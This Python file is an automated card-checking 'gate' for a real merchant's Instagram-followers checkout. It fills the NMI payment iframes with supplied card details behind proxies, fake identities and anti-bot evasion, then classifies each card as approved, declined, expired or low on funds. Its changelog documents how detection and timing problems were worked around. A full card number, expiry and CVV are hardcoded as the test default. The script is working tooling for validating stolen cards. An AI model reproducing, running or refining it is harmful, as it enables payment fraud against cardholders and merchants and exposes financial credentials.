#!/usr/bin/env python3
"""SocialBoosting Gate v9 — Production-grade with NMI API response parsing.

v9 changes from v8:
- Added NMI iframe polling: wait up to 15s for iframe frames to load
  (after selecting card payment, NMI iframes load asynchronously — 3s wasn't enough)
- Log all frame URLs at each poll attempt for debugging
- Increased wait after card radio selection to 5s before starting iframe poll

v9b changes:
- Added NMI input polling: retry 3x (2s each) for input elements inside NMI frames
  (iframe URL may show secure.nmi.com but internal DOM not ready yet)
- Added fallback selector: if named input not found, try any visible input
- Added 2s initial wait before typing for iframe content to render
- Better logging: shows which attempt failed and why

v10 changes:
- CRITICAL FIX: "Frame was detached" error — NMI iframes are created then
  destroyed/recreated by page JavaScript. Cached frame references become stale.
- FIX: Fresh-scan page.frames before EACH typing operation (no caching)
- Combined iframe discovery + typing into one retry loop per field
- Skip the 2s initial wait that caused detachment (type immediately on discovery)

v8 changes from v7:
- Increased page.goto timeout to 60s (proxies are slower)
- Changed wait_until from 'networkidle' to 'domcontentloaded' everywhere
  (networkidle is too strict for proxies — waits for ALL network to stop)
- Added retry logic: 2 retries on page load timeout with increasing timeouts
- Added proxy warmup/validation: brief navigation test before full checkout
- Increased browser context default timeouts for proxy environments

CRITICAL DISCOVERY from v6 testing:
The NMI payment response comes as a JSON API response on the network:
  URL: /nmi-checkout/create-payment/{orderid}
  Body: {"response":"2","responsetext":"Do Not Honor","authcode":"...",
          "transactionid":"...","avsresponse":"0","cvvresponse":"M",
          "orderid":"...","type":"auth","response_code":"201"}

NMI response codes:
  response="1" → APPROVED
  response="2" → DECLINED
  response="3" → ERROR

Common responsetext values:
  "Do Not Honor" (201) — generic decline
  "Insufficient Funds" (301) — not enough balance
  "Expired Card" (302) — card expired
  "Card Declined" — explicit decline
  "Approved" (100) — success

The popup on the page ("Oops! payment could not be processed") is just the UI
rendering of this NMI decline response. The ACTUAL classification must come from
the NMI API JSON, NOT from parsing page body text (which falsely matched APPROVED
due to generic site content containing "success"/"confirmed" words).

This version:
- PRIMARY: Parse NMI API JSON response from network logs
- SECONDARY: Classify popup text only if NMI API response wasn't captured
- Prevent false APPROVED from generic page content
- Handle NMI multipart tokenization flow properly
- Proxy-resilient: retry logic, generous timeouts, warmup check
"""

import asyncio, json, logging, os, random, re, string, time, traceback
from typing import Optional, Tuple, Dict, List
from playwright.async_api import async_playwright, Page, BrowserContext, Browser, Response

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
log = logging.getLogger("sb_gate")

BASE = "https://www.socialboosting.com"
PKG = {"name": "250 Instagram Followers", "price": 6.00, "currency": "USD"}
SS_DIR = "/home/z/my-project/Proje234/screenshots"
os.makedirs(SS_DIR, exist_ok=True)

_FN = ["James","John","Robert","Michael","David","Emma","Olivia","Ava","Sophia","Mia","Charlotte","Emily"]
_LN = ["Smith","Johnson","Brown","Jones","Garcia","Miller","Davis","Wilson","Anderson","Taylor","Moore","Jackson"]
_DM = ["gmail.com","outlook.com","yahoo.com","hotmail.com","icloud.com","mail.com"]

def _rn(): return random.choice(_FN), random.choice(_LN)
def _re(f,l): n=''.join(random.choices(string.digits,k=random.randint(2,4))); return f"{f.lower()}.{l.lower()}{n}@{random.choice(_DM)}"
def _rh(): return f"{random.choice(['user','the','just','real','my','im'])}{''.join(random.choices(string.ascii_lowercase+string.digits,k=random.randint(3,6)))}"

async def ss(page, name, rid):
    p = os.path.join(SS_DIR, f"{rid}_{name}_{int(time.time())}.png")
    try: await page.screenshot(path=p, full_page=True); log.info(f"SS: {p}")
    except: pass


# ══════════════════════════════════════════════════════════════════
# NMI Response Classification
# ══════════════════════════════════════════════════════════════════

def classify_nmi_api_response(nmi_json: dict) -> Tuple[bool, str]:
    """Classify the NMI payment API JSON response.
    
    NMI API response format:
      response: "1" = Approved, "2" = Declined, "3" = Error
      responsetext: Human-readable message
      response_code: Numeric code (100=approved, 201=do not honor, etc.)
    
    Returns: (success, message)
    """
    response_val = nmi_json.get("response", "")
    responsetext = nmi_json.get("responsetext", "")
    response_code = nmi_json.get("response_code", "")
    
    # ── APPROVED ──
    if response_val == "1":
        return True, "APPROVED"
    
    # ── DECLINED ──
    if response_val == "2":
        # Map specific NMI decline codes to our taxonomy
        decline_text = responsetext.lower()
        decline_code = str(response_code)
        
        # Insufficient funds (NMI codes: 301, 302, sometimes 200)
        if "insufficient" in decline_text or decline_code in ("301", "200"):
            return False, "INSUFFICIENT_FUNDS"
        
        # Expired card (NMI code: 302)
        if "expired" in decline_text or decline_code == "302":
            return False, "EXPIRED_CARD"
        
        # 3DS required (NMI doesn't typically return this, but some gateways do)
        if "3ds" in decline_text or "3d secure" in decline_text or "verify" in decline_text:
            return False, "3DS_REQUIRED"
        
        # All other declines: CARD_DECLINED
        # This covers: "Do Not Honor" (201), "Card Declined", "Invalid Card",
        # "Transaction Not Allowed", "Not Permitted", etc.
        return False, "CARD_DECLINED"
    
    # ── ERROR ──
    if response_val == "3":
        return False, "SITE_ERROR"
    
    # ── Unknown response value ──
    return False, "SITE_ERROR"


def classify_popup_text(text: str, url: str) -> Tuple[bool, str]:
    """Fallback classifier using popup/modal text and URL.
    
    Only used when the NMI API JSON response wasn't captured from network.
    IMPORTANT: This must NOT false-positive on generic site content.
    We only classify based on VISIBLE popup/modal error messages.
    """
    t = (text or "").lower()
    u = (url or "").lower()
    
    # ── APPROVED: Only via explicit URL patterns (not generic body text) ──
    if any(k in u for k in ["thank_you", "thankyou", "confirmation", "order-complete", "order_confirmed"]):
        return True, "APPROVED"
    
    # ── 3DS ──
    if any(k in t for k in ["3ds", "3d secure", "verify your card"]):
        return False, "3DS_REQUIRED"
    
    # ── INSUFFICIENT ──
    if "insufficient" in t and ("funds" in t or "balance" in t):
        return False, "INSUFFICIENT_FUNDS"
    
    # ── EXPIRED ──
    if "expired" in t and "card" in t:
        return False, "EXPIRED_CARD"
    
    # ── CARD DECLINED: popup patterns from actual testing ──
    # "Oops! It looks like your payment could not be processed..."
    # "Something went wrong with your payment"
    for pattern in [
        r"oops",
        r"payment.*could.*not.*be.*processed",
        r"could.*not.*be.*processed",
        r"something.*went.*wrong.*with.*your.*payment",
        r"declined",
        r"payment.*failed",
        r"do not honor",
        r"invalid.*(card|cvv|expiry|number)",
        r"transaction.*(denied|rejected|failed)",
        r"unable.*to.*process",
        r"try.*another.*(?:payment|card|method)",
        r"double.*check.*your.*payment",
        r"went.*wrong.*here",  # "Looks like something went wrong here!"
    ]:
        if re.search(pattern, t):
            return False, "CARD_DECLINED"
    
    # ── Catch remaining error patterns ──
    if any(k in t for k in ["error", "failed", "wrong", "unable", "invalid", "not processed"]):
        return False, "CARD_DECLINED"
    
    # ── Default: unknown error ──
    return False, "SITE_ERROR"


def parse_proxy(ps):
    """Parse proxy string into Playwright proxy dict."""
    if not ps: return {}
    from urllib.parse import urlparse
    if ps.startswith(("http://","https://","socks5://","socks4://")):
        p = urlparse(ps); d = {"server": f"{p.scheme}://{p.hostname}:{p.port}"}
        if p.username: d["username"] = p.username
        if p.password: d["password"] = p.password
        return d
    parts = ps.split(":")
    if len(parts) >= 2:
        d = {"server": f"http://{parts[0]}:{parts[1]}"}
        if len(parts) >= 4: d["username"] = parts[2]; d["password"] = parts[3]
        return d
    return {}


async def safe_goto(page, url, timeout=60000, wait_until="domcontentloaded", max_retries=2):
    """Navigate to a URL with retry logic and proxy-resilient settings.
    
    Proxies can be slow and unreliable. This helper:
    - Uses 'domcontentloaded' instead of 'networkidle' (much faster, less strict)
    - Retries on timeout up to max_retries times with increasing timeouts
    - Logs each attempt clearly
    
    Returns: True if navigation succeeded, False if all retries failed.
    """
    for attempt in range(max_retries + 1):
        current_timeout = timeout + (attempt * 15000)  # Increase by 15s each retry
        log.info(f"[GOTO] Attempt {attempt+1}/{max_retries+1}: {url} timeout={current_timeout}s wait_until={wait_until}")
        try:
            await page.goto(url, timeout=current_timeout, wait_until=wait_until)
            log.info(f"[GOTO] Success on attempt {attempt+1}")
            return True
        except Exception as e:
            log.warning(f"[GOTO] Attempt {attempt+1} failed: {e}")
            if attempt < max_retries:
                # Brief pause before retry — let proxy/network recover
                await page.wait_for_timeout(3000)
            else:
                log.error(f"[GOTO] All {max_retries+1} attempts failed")
                return False


async def socialboosting_checkout(cc, mes, ano, cvv, proxy_str=None):
    """Full end-to-end SocialBoosting checkout flow.
    
    Returns: (success, message, gateway, price, currency)
    
    Classification strategy:
    1. PRIMARY: Parse NMI API JSON response from network logs
       (URL pattern: /nmi-checkout/create-payment/{orderid})
    2. SECONDARY: Classify popup text if NMI API wasn't captured
    """
    fn, ln = _rn(); email = _re(fn, ln); handle = _rh()
    rid = f"sb_{int(time.time())}"
    log.info(f"=== START card={cc[:6]}** handle={handle} email={email} ===")
    
    pw = await async_playwright().start()
    browser = None; ctx = None
    
    # Track NMI payment API responses (the critical classification source)
    nmi_payment_response = None  # The final payment response JSON
    
    try:
        browser = await pw.chromium.launch(
            headless=True,
            args=[
    "--ignore-certificate-errors",
    "--ignore-certificate-errors",
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
            ],
            proxy=parse_proxy(proxy_str) if proxy_str else None,
        )
        ctx = await browser.new_context(
            viewport={"width": 1280, "height": 800},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            locale="en-US",
            timezone_id="America/New_York",
        )
        # Set generous default timeouts for proxy environments
        ctx.set_default_navigation_timeout(90000)
        ctx.set_default_timeout(60000)
        
        # Anti-detection: hide webdriver flag, add chrome runtime
        await ctx.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            window.chrome = {runtime: {}};
        """)
        page = await ctx.new_page()
        
        # ── Network response monitoring ──
        # We specifically capture the NMI payment API response.
        # This is the JSON at /nmi-checkout/create-payment/{orderid}
        # which contains the actual approve/decline decision.
        async def on_response(response: Response):
            url = response.url
            # Only capture the NMI payment response endpoint
            if "nmi-checkout/create-payment" in url:
                try:
                    body = await response.text()
                    log.info(f"NMI_PAYMENT_API: {url} → {response.status} body={body[:500]}")
                    try:
                        nmi_json = json.loads(body)
                        # Store the payment response (this is what we classify)
                        nonlocal nmi_payment_response
                        nmi_payment_response = nmi_json
                        log.info(f"NMI_PAYMENT_JSON: response={nmi_json.get('response')} "
                                 f"responsetext={nmi_json.get('responsetext')} "
                                 f"response_code={nmi_json.get('response_code')}")
                    except json.JSONDecodeError:
                        log.warning(f"NMI payment response not valid JSON: {body[:200]}")
                except Exception as e:
                    log.warning(f"Failed to read NMI payment response: {e}")
        page.on("response", on_response)
        
        # ══════════════════════════════════════════════════════════════════
        # STEP 0: Proxy warmup (optional — validates proxy can reach site)
        # ══════════════════════════════════════════════════════════════════
        if proxy_str:
            log.info("Step 0: Proxy warmup — brief test navigation")
            warmup_ok = await safe_goto(page, BASE, timeout=45000, max_retries=1)
            if not warmup_ok:
                log.error("Proxy warmup FAILED — proxy may be down or blocked")
                await ss(page, "warmup_fail", rid)
                # Check if we got "Region Not Supported" page
                body_text = await page.evaluate("() => document.body?.innerText?.substring(0, 500) || ''")
                if "region" in body_text.lower() and "not supported" in body_text.lower():
                    log.error("Region Not Supported — proxy IP is in blocked region")
                    return False, "SITE_ERROR", "SOCIALBOOSTING", 0.0, "USD"
                # Proxy connectivity failure
                return False, "SITE_ERROR", "SOCIALBOOSTING", 0.0, "USD"
            log.info("Proxy warmup OK — site reachable through proxy")
        
        # ══════════════════════════════════════════════════════════════════
        # STEP 1: Account info page
        # ══════════════════════════════════════════════════════════════════
        log.info("Step 1: Navigate to account-info page")
        goto_ok = await safe_goto(
            page,
            f"{BASE}/buy-instagram-followers/instagram-account-information/250-followers",
            timeout=60000,
            max_retries=2,
        )
        if not goto_ok:
            log.error("Failed to load account-info page after retries")
            await ss(page, "step1_fail", rid)
            return False, "SITE_ERROR", "SOCIALBOOSTING", 0.0, "USD"
        
        # Wait for dynamic content to load (forms, JS, etc.)
        await page.wait_for_timeout(3000)
        
        # ── Check for "Region Not Supported" page ──
        region_check = await page.evaluate("() => document.body?.innerText?.substring(0, 300) || ''")
        if "region" in region_check.lower() and "not supported" in region_check.lower():
            log.error("Region Not Supported page detected — proxy IP is in blocked region")
            await ss(page, "region_blocked", rid)
            return False, "SITE_ERROR", "SOCIALBOOSTING", 0.0, "USD"
        
        # Fill Instagram handle
        handle_input = await page.query_selector(
            "input[name='socialboosting_platform_checkout_account_information[handle]']"
        )
        if handle_input:
            await handle_input.fill(handle)
            log.info(f"Filled handle: {handle}")
        else:
            log.error("Handle input NOT found")
            await ss(page, "no_handle_input", rid)
            return False, "SITE_ERROR", "SOCIALBOOSTING", 0.0, "USD"
        
        # Fill email
        email_input = await page.query_selector(
            "input[name='socialboosting_platform_checkout_account_information[email]']"
        )
        if email_input:
            await email_input.fill(email)
            log.info(f"Filled email: {email}")
        else:
            log.error("Email input NOT found")
            await ss(page, "no_email_input", rid)
            return False, "SITE_ERROR", "SOCIALBOOSTING", 0.0, "USD"
        
        # Wait for JS validation
        await page.wait_for_timeout(1500)
        
        # Click submit button ("Proceed to cart")
        submit_btn = await page.query_selector(
            "button.js-submit, button.form__btn, button[type='submit']"
        )
        if submit_btn:
            try:
                await submit_btn.click(timeout=10000)
            except:
                await submit_btn.evaluate("el => el.click()")
            log.info("Submitted account info form")
        else:
            log.error("Submit button NOT found")
            await ss(page, "no_submit_btn", rid)
            return False, "SITE_ERROR", "SOCIALBOOSTING", 0.0, "USD"
        
        # Wait for page transition (form submission + redirect)
        await page.wait_for_timeout(5000)
        log.info(f"After account-info submit URL: {page.url}")
        
        # ══════════════════════════════════════════════════════════════════
        # STEP 2: Skip upsell (package-additions page)
        # ══════════════════════════════════════════════════════════════════
        if "package-additions" in page.url:
            log.info("Step 2: Skipping upsell page")
            skip_btn = await page.query_selector(
                "button.form__btn--alt, button.js-submit, button[type='submit'], "
                "a.skip-btn, button.skip"
            )
            if skip_btn:
                try: await skip_btn.click(timeout=10000)
                except: await skip_btn.evaluate("el => el.click()")
                log.info("Skipped upsell")
            else:
                # Fallback: click any "proceed/continue/skip" button
                buttons = await page.query_selector_all("button")
                for b in buttons:
                    txt = await b.text_content()
                    if txt and any(k in txt.lower() for k in ["proceed", "continue", "skip", "next", "no thanks"]):
                        try: await b.click(timeout=8000); log.info(f"Clicked: {txt}"); break
                        except: continue
            
            await page.wait_for_timeout(5000)
            log.info(f"After upsell skip URL: {page.url}")
        
        # ══════════════════════════════════════════════════════════════════
        # STEP 3: Payment page (cart-summary)
        # ══════════════════════════════════════════════════════════════════
        log.info(f"Step 3: Cart-summary/payment page. URL: {page.url}")
        await ss(page, "step3_cart_summary", rid)
        
        # Select card payment method
        card_radio = await page.query_selector("input#card-pay[name='payment-method']")
        if card_radio:
            await card_radio.check()
            log.info("Selected card payment method")
            await page.wait_for_timeout(5000)  # Give NMI iframes time to start loading
        else:
            log.warning("Card radio not found — may be pre-selected")
            # Try clicking card label
            card_label = await page.query_selector("label[for='card-pay']")
            if card_label:
                try: await card_label.click(timeout=8000); log.info("Clicked card label")
                except: pass
            await page.wait_for_timeout(5000)
        
        # ── Wait briefly then poll for NMI iframe frames ──
        # After selecting card payment, NMI creates iframe elements that load
        # from secure.nmi.com. These frames can be DETACHED by page JS and recreated.
        # So we DON'T cache frame references — we fresh-scan page.frames each time.
        
        # Wait for iframe creation to start
        await page.wait_for_timeout(5000)
        
        # Quick check: are NMI frames visible in page.frames?
        nmi_present = False
        for fr in page.frames:
            if "secure.nmi.com" in fr.url:
                nmi_present = True
                break
        if not nmi_present:
            log.error("No NMI iframe frames found in page.frames after 5s wait")
            for fr in page.frames:
                log.info(f"  Frame: {fr.url[:200]}")
            await ss(page, "no_nmi_frames", rid)
            return False, "SITE_ERROR", "SOCIALBOOSTING", 0.0, "USD"
        
        # ── Type card data into NMI iframes — fresh-scan each time ──
        # NMI iframes can be detached/recreated by page JS, so we MUST
        # find the LIVE frame from page.frames right before typing.
        # We retry up to 5 times per field (2s between retries).
        cc_filled = False; exp_filled = False; cvv_filled = False
        
        async def type_in_nmi_frame(element_id, input_name, value, delay=80, label=""):
            """Find the current LIVE NMI frame and type into it.
            
            CRITICAL: We fresh-scan page.frames each time because NMI frames
            can be detached/recreated by the page's JavaScript.
            Caching frame references causes 'Frame was detached' errors.
            """
            for attempt in range(5):
                # Fresh-scan page.frames for the LIVE frame
                live_frame = None
                for fr in page.frames:
                    fu = fr.url
                    if "secure.nmi.com" in fu and f"elementId={element_id}" in fu:
                        live_frame = fr
                        break
                
                if live_frame is None:
                    log.warning(f"  {label}: Live frame not found (attempt {attempt+1}/5) — may be recreating")
                    await page.wait_for_timeout(2000)
                    continue
                
                try:
                    inp = await live_frame.query_selector(f"input[name='{input_name}']")
                    if inp is None:
                        # Fallback: try any visible text-like input
                        inp = await live_frame.query_selector("input[type='text'], input:not([type='hidden']), input")
                    if inp is None:
                        log.warning(f"  {label}: Input element not found inside frame (attempt {attempt+1}/5)")
                        await page.wait_for_timeout(2000)
                        continue
                    
                    # Type immediately — don't delay, frame might get detached
                    await inp.click()
                    await page.wait_for_timeout(200)
                    await inp.type(value, delay=delay)
                    log.info(f"Typed {label}: {value if label != 'CC' else value[:6]+'****'+value[-4:]}")
                    return True
                except Exception as e:
                    log.warning(f"  {label}: attempt {attempt+1} failed: {e}")
                    await page.wait_for_timeout(2000)
            
            log.error(f"  {label}: all 5 attempts failed")
            return False
        
        cc_filled = await type_in_nmi_frame("ccnumber", "ccnumber", cc, delay=80, label="CC")
        exp_str = f"{mes}/{ano[-2:]}"
        exp_filled = await type_in_nmi_frame("ccexp", "ccexp", exp_str, delay=100, label="Expiry")
        cvv_filled = await type_in_nmi_frame("cvv", "cvv", cvv, delay=80, label="CVV")
        
        log.info(f"NMI fill results: CC={cc_filled} Exp={exp_filled} CVV={cvv_filled}")
        
        if not (cc_filled and exp_filled and cvv_filled):
            log.error("Not all NMI fields filled")
            await ss(page, "nmi_fill_fail", rid)
            return False, "SITE_ERROR", "SOCIALBOOSTING", 0.0, "USD"
        
        # ── Wait for NMI tokenization ──
        log.info("Waiting for NMI tokenization to complete...")
        token_ready = False
        for attempt in range(6):
            await page.wait_for_timeout(3000)
            pay_btn = await page.query_selector("button.js-nmi-submit-btn")
            if pay_btn:
                is_disabled = await pay_btn.evaluate(
                    "el => el.classList.contains('btn--disabled') || el.disabled"
                )
                log.info(f"  Token poll {attempt+1}: Pay btn disabled={is_disabled}")
                if not is_disabled:
                    token_ready = True
                    break
        
        if not token_ready:
            log.warning("NMI tokenization may not have completed — proceeding anyway")
        
        await ss(page, "step3_before_pay", rid)
        
        # ── Click the Pay button ──
        pay_btn = await page.query_selector("button.js-nmi-submit-btn")
        if not pay_btn:
            log.error("Pay button not found")
            await ss(page, "no_pay_btn", rid)
            return False, "SITE_ERROR", "SOCIALBOOSTING", 0.0, "USD"
        
        btn_text = await pay_btn.text_content()
        log.info(f"Pay button: '{btn_text}'")
        
        # Reset nmi_payment_response before clicking (we want the NEW response)
        nmi_payment_response = None
        
        log.info("Clicking Pay button...")
        try:
            await pay_btn.click(timeout=15000)
            log.info("Pay button click succeeded")
        except Exception as e:
            log.warning(f"Pay click failed: {e} — trying JS fallback")
            try:
                await page.evaluate("() => { document.querySelector('.js-nmi-submit-btn')?.click(); }")
            except: pass
        
        # ══════════════════════════════════════════════════════════════════
        # STEP 4: Wait for NMI API response + popup
        # ══════════════════════════════════════════════════════════════════
        log.info("Step 4: Waiting for payment response...")
        
        # The NMI API response comes as an AJAX POST to /nmi-checkout/create-payment/
        # This is captured by our network response handler.
        # We also check for navigation (approval → thank_you page) and popup (decline).
        
        # Wait for either: navigation to thank_you OR NMI API response OR popup
        for wait_attempt in range(20):  # 20 × 2s = 40s max (increased from 30s)
            await page.wait_for_timeout(2000)
            
            # Check 1: Did we capture the NMI API JSON response?
            if nmi_payment_response is not None:
                log.info(f"NMI API response captured after {wait_attempt+1} × 2s wait")
                break
            
            # Check 2: Did the page navigate to a confirmation page?
            current_url = page.url
            if any(k in current_url for k in ["thank_you", "thankyou", "confirmation", "order-complete"]):
                log.info(f"Navigation to confirmation page: {current_url}")
                break
        
        await ss(page, "step4_final", rid)
        
        # ══════════════════════════════════════════════════════════════════
        # STEP 5: Classify the response
        # ══════════════════════════════════════════════════════════════════
        
        # ── PRIMARY: NMI API JSON response ──
        if nmi_payment_response is not None:
            log.info(f"Classifying based on NMI API JSON response")
            log.info(f"  NMI response={nmi_payment_response.get('response')} "
                     f"responsetext='{nmi_payment_response.get('responsetext')}' "
                     f"response_code={nmi_payment_response.get('response_code')}")
            success, message = classify_nmi_api_response(nmi_payment_response)
            log.info(f"NMI classification: success={success} message={message}")
        else:
            # ── SECONDARY: Popup text classification ──
            log.warning("NMI API response NOT captured — falling back to popup text classification")
            
            # Capture popup/modal text
            popup_texts = await page.evaluate("""() => {
                const results = [];
                const selectors = [
                    '.modal', '.popup', '.overlay', '.modal-overlay',
                    '.u-modal', '.u-modal-box',
                    '.sg-popup', '.checkout-popup', '.payment-popup',
                    '.form__error', '.form__success',
                    '.error', '.success', '.alert',
                    '.notification', '.toast', '.sg-message',
                    '[class*="modal"]', '[class*="popup"]',
                    '[class*="overlay"]', '[class*="error"]',
                    '[class*="success"]', '[class*="message"]',
                    '[class*="notification"]', '[class*="alert"]',
                    '[class*="oops"]',
                ];
                for (const sel of selectors) {
                    try {
                        const els = document.querySelectorAll(sel);
                        for (const el of els) {
                            if (el.offsetParent !== null || el.style.display !== 'none') {
                                const txt = el.textContent.trim();
                                if (txt.length > 3) {
                                    results.push(txt.substring(0, 500));
                                }
                            }
                        }
                    } catch(e) {}
                }
                return results;
            }""")
            
            popup_combined = " ".join(popup_texts) if popup_texts else ""
            final_url = page.url
            
            log.info(f"Popup texts found: {len(popup_texts)}")
            for pt in popup_texts:
                log.info(f"  POPUP: {pt[:200]}")
            
            success, message = classify_popup_text(popup_combined, final_url)
            log.info(f"Popup classification: success={success} message={message}")
        
        # ── Final result ──
        log.info(f"FINAL RESULT: success={success} message={message} "
                 f"gateway=SOCIALBOOSTING price={PKG['price']} currency={PKG['currency']}")
        
        return success, message, "SOCIALBOOSTING", PKG["price"], PKG["currency"]
    
    except Exception as e:
        log.error(f"EXCEPTION: {e}")
        traceback.print_exc()
        return False, "SITE_ERROR", "SOCIALBOOSTING", 0.0, "USD"
    finally:
        try:
            if ctx: await ctx.close()
            if browser: await browser.close()
            await pw.stop()
        except: pass


async def test_checkout(cc=None, mes=None, ano=None, cvv=None, proxy=None):
    """Test function — defaults to Wise card."""
    if cc is None: cc = "4596610295349359"
    if mes is None: mes = "07"
    if ano is None: ano = "2027"
    if cvv is None: cvv = "074"
    
    log.info("=" * 60)
    log.info("SOCIALBOOSTING GATE v10 — TEST")
    log.info(f"Card: {cc[:6]}****{cc[-4:]} Exp: {mes}/{ano} CVV: {cvv}")
    if proxy: log.info(f"Proxy: {proxy}")
    log.info("=" * 60)
    
    result = await socialboosting_checkout(cc, mes, ano, cvv, proxy)
    
    log.info("=" * 60)
    log.info(f"RESULT: {result[1]} — {result[0]}")
    log.info(f"  Success:  {result[0]}")
    log.info(f"  Message:  {result[1]}")
    log.info(f"  Gateway:  {result[2]}")
    log.info(f"  Price:    ${result[3]}")
    log.info(f"  Currency: {result[4]}")
    log.info("=" * 60)
    return result


if __name__ == "__main__":
    asyncio.run(test_checkout())
